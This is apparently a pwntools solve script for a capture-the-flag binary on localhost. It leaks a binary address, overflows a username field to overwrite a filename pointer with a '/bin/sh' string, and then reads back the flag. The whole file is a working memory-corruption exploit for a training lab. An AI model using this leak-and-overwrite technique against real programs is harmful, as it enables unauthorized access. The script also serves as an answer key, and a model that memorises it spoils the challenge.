from pwn import * 

context.arch="x86_64"

def main():


    HOST = "localhost"
    PORT = 9004

    local = False

    if local:

        p = process("../challenge/chall") 

    else:

        p = remote(HOST, PORT)

    p.sendlineafter("name: ", "A" * 32)
    p.sendlineafter("> ", "2")
    p.recv(32)

    binary_leak = p.recvuntil(b"\n", drop=True).ljust(8, b'\x00')
    binary_leak = u64(binary_leak)

    log.info(f"binary leak: {hex(binary_leak)}")

    file_name_pointer = binary_leak + 0x2050
    file_name = b"/bin/sh\x00"

    payload = file_name 
    payload += b'A' * (32 - len(file_name))
    payload += p64(file_name_pointer)[:6]

    p.sendlineafter("> ", "1")
    p.sendlineafter("username: ", payload)

    guess = 1179403647

    p.sendlineafter("> ", "3")
    p.sendlineafter("Guess: ", str(guess))

    flag = p.recv().decode()

    log.info(f"FLAG: {flag}")
    

if __name__ == "__main__":

    main()